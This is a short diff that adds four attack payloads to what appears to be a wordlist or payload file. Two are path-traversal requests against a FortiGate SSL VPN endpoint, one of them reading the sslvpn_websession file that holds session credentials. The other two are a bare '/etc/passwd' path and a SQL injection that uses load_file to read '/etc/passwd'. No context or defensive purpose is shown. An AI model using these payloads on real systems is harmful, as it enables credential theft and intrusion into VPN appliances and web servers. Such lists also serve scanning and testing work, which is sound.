@@ -1,0 +1,4 @@
+etc/passwd
+remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd
+remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
+union select 1,load_file('/etc/passwd'),1,1,1;
